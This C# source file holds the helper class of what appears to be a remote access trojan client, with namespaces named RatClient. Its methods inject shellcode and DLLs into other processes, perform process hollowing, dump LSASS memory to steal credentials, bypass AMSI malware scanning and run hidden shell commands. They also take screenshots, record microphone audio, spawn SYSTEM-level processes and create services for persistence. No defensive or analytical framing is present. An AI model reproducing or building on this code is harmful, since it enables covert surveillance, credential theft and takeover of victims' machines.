using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using RatClient.Mtool;
using System.Management;
using System.Security.Principal;
using System.Runtime.Serialization.Json;
using System.Net.Configuration;
using RatClient.SymetricCrypto;
using RatClient.AcRSA;
using System.Text;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

public class Tools
{
    private static int getProcidByname(string name)
    {
        return Process.GetProcessesByName(name.Replace(".exe", ""))[0].Id;
    }

    public static bool imSystemUser()
    {
        WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
        return currentUser.User.Value.Equals("S-1-5-18", StringComparison.OrdinalIgnoreCase);
    }

    public static bool IsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static byte[] RunAsCurrentUser(string process, string command)
    {
        List<byte> output = new List<byte>(); 
        IntPtr hRead;
        int chunck = 4096;
        int res = NativeMethods.RunAsLoggedInUser(process + command, out hRead);
        if (res == 0)
        {
            byte[] buffer = new byte[chunck];
            int bytesRead = NativeMethods.ReadFromPipe(hRead, buffer, chunck);
            while (bytesRead > 0)
            {
                foreach(byte i in buffer.Take(bytesRead))
                {
                    output.Add(i);
                }
                bytesRead = NativeMethods.ReadFromPipe(hRead, buffer, chunck);
            }
        }
        return output.ToArray();
    }
    public static bool StartAsSpawnedSystem(string appName, string parentName = null, string arguments = null)
    {
        int parentID;
        if (parentName != null)
        {
            parentID = getProcidByname(parentName);
        }
        else
        {
            parentID = (int)NativeMethods.GetSystemPID();
        }
        return NativeMethods.SpawnSystem(parentID, appName, arguments) == 0;
    }

    public static bool InjectProcess(byte[] shellCode, int procid= -1, string name = null)
    {
        if (procid == -1 && name == null) 
        {
            throw new Exception("Function must recive process id or process name");
        }
        if (name != null)
        {
            procid = getProcidByname(name);
        }
        UIntPtr size_T = (UIntPtr)shellCode.Length;
        Info.AddInjectProcess(procid);
        if (NativeMethods.Inject(procid, shellCode, size_T) == 0)
        {
            Info.AddInjectProcess(procid);
            return true; 
        }
        return false;
    }


    private static byte[] GetByteFromMS(MemoryStream res, bool compressed, string algo = "zlib")
    {
        byte[] data = res.ToArray();
        if (compressed)
        {
            using (var ms = new MemoryStream())
            {
                using (var stream = Info.AlgorithmsCompress[algo](ms))
                {
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
                return ms.ToArray();
            }
        }
        return data;
    }

    public static int[] GetResolution()
    {
        IntPtr ptr = NativeMethods.getResolution();
        int[] resolution = new int[2];
        Marshal.Copy(ptr, resolution, 0, 2);
        return new int[2] { resolution[0], resolution[1] };
    }

    public static byte[] ScreenShot(bool Compresed = false)
    {
        int w = Info.Resoulution.Width;
        int h = Info.Resoulution.Height;
        using (Bitmap screenshot = new Bitmap(w, h))
        {
            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                Size s = new Size(w, h);
                graphics.CopyFromScreen(0, 0, 0, 0, s, CopyPixelOperation.SourceCopy);
            }
            using (MemoryStream ms = new MemoryStream())
            {
                screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return GetByteFromMS(ms, Compresed, "gzip");
            }
        }
    }

    public static byte[] RecordAudio(string time)
    {
        char type = time[time.Length - 1];
        string num = time.TrimEnd(type);
        bool isNum = int.TryParse(num, out int range);
        if (!isNum)
        {
            throw new Exception("Wrong range time");
        }
        range = Info.GetmilisecRange[type](range);
        AudioRecorder ar = new AudioRecorder();
        ar.StartRecording();
        System.Threading.Thread.Sleep(range);
        return ar.StopRecording();
    }

	public static byte[] RunCommand(string command, bool addCd = false)
	{
		if (string.IsNullOrEmpty(command))
		{
			return new byte[1] { 32 };
		}
        string filename = Info.MainShell;
		string arguments = filename == "cmd.exe" ? $"/c {command}"
				 : filename == "powershell.exe" ? $"-command {command}"
				 : throw new ArgumentException("Invalid filename.");
		byte[] outputBytes = null;
		ProcessStartInfo proc = new ProcessStartInfo();
		proc.Arguments = arguments;
		proc.FileName = filename;
		proc.RedirectStandardOutput = true;
		proc.RedirectStandardError = true;
		proc.UseShellExecute = false;
		proc.CreateNoWindow = true;

		Process process = Process.Start(proc);

		using (MemoryStream ms = new MemoryStream())
		{
			process.StandardOutput.BaseStream.CopyTo(ms);
			process.StandardError.BaseStream.CopyTo(ms);  
			if (ms.Length > 0)
			{
				outputBytes = ms.ToArray();
			}
			else
			{
				outputBytes = new byte[1] { 32 };
			}
		}

		process.WaitForExit();
		process.Close();

		return buildCommandOutput(outputBytes, addCd);
	}

    private static byte[] buildCommandOutput(byte[] standartOut, bool addCd = false)
    {
        if (!addCd)
        {
			return standartOut;
        }
        string part1 = Info.MainShell == "powershell.exe" ? "PS " : "";
		byte[] fullres = Encoding.UTF8.GetBytes($"{part1}{Directory.GetCurrentDirectory()}>");
		return fullres.Concat(standartOut).ToArray(); 
    }

    public static byte[] SwitchShell(string shell)
    {
		Console.WriteLine("swithing to powershell");
		Info.MainShell = "powershell.exe";
		byte[] output = buildCommandOutput(
            Encoding.UTF8.GetBytes(Tools.GetBanner(shell)),addCd:true);
		Console.WriteLine("powershell was set");
		return output;
	}
	public static string GetUserSid()
    {
        string sid;
        string query = "SELECT UserName FROM Win32_ComputerSystem";
        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
        {
            var username = (string)searcher.Get().Cast<ManagementBaseObject>().First()["UserName"];

            string[] res = username.Split('\\');
            if (res.Length != 2) throw new InvalidOperationException("Invalid username format.");

            string domain = res[0];
            string name = res[1];
            query = $"SELECT Sid FROM Win32_UserAccount WHERE Domain = '{domain}' AND Name = '{name}'";
            using (ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(query))
            {
                sid = (string)searcher2.Get().Cast<ManagementBaseObject>().First()["Sid"];
            }
        }
        return sid;
    }

    public static string HomePath()
    {
        using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
        {
            using (RegistryKey subkey = key.OpenSubKey($"Software\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{GetUserSid()}"))
            {
                object value = subkey.GetValue("ProfileImagePath");
                if (value != null)
                {
                    return value.ToString();
                }
            }
        }
        return null;
    }

    public static string GetOwnerByPid(uint processId)
    {
        NativeMethods.GetUserNameByPid(processId, out IntPtr buffer);
        string result = Marshal.PtrToStringUni(buffer);
        Marshal.FreeHGlobal(buffer);
        if (result != null && result.Length > 0) 
        {
            return result;
        }
        return "Unknow";
    }

    public static byte[] SerializeToJson<T>(T obj)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(T));
            serializer.WriteObject(ms, obj);
            return ms.ToArray();
        }
    }

    public static bool RunShellCode(byte[] shellCode)
    {
        int size = shellCode.Length;
        return NativeMethods.runShellCode(shellCode, size) == 0;
    }

    public static bool CreatProcWinAPI(string process, string argument)
    {
        return NativeMethods.CreateNewProcess(process, argument) == 0;
    }

    public static string ArgsParse(string key, string[] args)
    {
        var keyIndex = Array.IndexOf(args, key);
        if (keyIndex >= 0 && keyIndex + 1 < args.Length)
        {
            return args[keyIndex + 1];
        }
        return null;
    }

    public static byte[] GetLsassdmp()
    {
        int res = NativeMethods.LSASSDump();
        Console.WriteLine(res);
        byte[]  buffer = File.ReadAllBytes("dumpfile.dmp");
        File.Delete("dumpfile.dmp");
        return buffer;
    }

    public static bool BypassAmsi()
    {
        return NativeMethods.AmsiBypass() == 0;
    }

    public static bool CreateNewService(string binpath, string serviceName, string serviceDescription)
    {
        return NativeMethods.createSrv(binpath, serviceName, serviceDescription) == 0;
    }
    
    public static string GetRandomeFile(string basePath, string type = null) 
    {
		string name = $"{Path.GetRandomFileName().Split('.')[0]}";
        if (type != null)
        {
            name += $".{type}";
		}
		return Path.Combine(basePath, name);
	}

    public static bool DllInjection(int pid, byte[] payloadDll)
    {
        string path = GetRandomeFile(Path.GetTempPath(),"dll");
		Console.WriteLine($"creating random file {path}");
		File.WriteAllBytes(path, payloadDll);
        if( NativeMethods.InjectDll(pid, path) == 0)
        {
            Info.AddInjectProcess(pid);
            return true;
		}
        return false;
    }

    public static bool ProcessHollowing(string targetPath, byte[] exePayload)
    {
        return NativeMethods.HollowProcess(targetPath, exePayload, exePayload.Length) == 0;
    }

    public static bool Isx64Exe(string exe)
    {
        bool result;
        if (!exe.EndsWith(".exe"))
        {
            result = false;
        }
        else if (!File.Exists(exe))
        {
			result = false;
		}
        else
        {
            result = NativeMethods.isx64Exe(exe);
        }
        return result;
    }

	public static string GetBanner(string file)
	{
		var psi = new ProcessStartInfo
		{
			FileName = file,
			RedirectStandardOutput = true,
			RedirectStandardInput = true,
			UseShellExecute = false
		};

		var p = Process.Start(psi);
		p.StandardInput.WriteLine("exit");
		string output = p.StandardOutput.ReadToEnd();
		p.WaitForExit();
		if (output.Contains("exit"))
		{
			string[] result = output.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
			return string.Join("\n\n", result.Take(result.Length - 1).ToArray());
		}
		return output;
	}
}
